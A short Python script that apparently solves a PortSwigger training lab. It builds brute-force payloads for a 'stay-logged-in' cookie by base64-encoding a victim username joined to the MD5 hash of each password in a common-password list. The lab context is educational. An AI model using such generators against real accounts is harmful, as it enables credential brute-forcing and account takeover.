#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Script to generate coded value pairs to exploit "Brute-forcing a stay-logged-in cookie" lab at
# "https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay".
#
# by Psycho (@UDPsycho)
#   Twitter: https://www.twitter.com/UDPsycho
#

import sys
import hashlib
import base64


passwords = ("123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow")
payloads = []


if len(sys.argv) != 2:
  print ("\nUsage: {} <victim_user>\n".format(sys.argv[0]))

else:

  for password in passwords:
    payloads.append(hashlib.md5(password.encode("utf-8")).hexdigest())

  for payload in payloads:
    print (base64.b64encode(sys.argv[1].encode("utf-8") + ":".encode("utf-8") + payload.encode("utf-8")).decode())
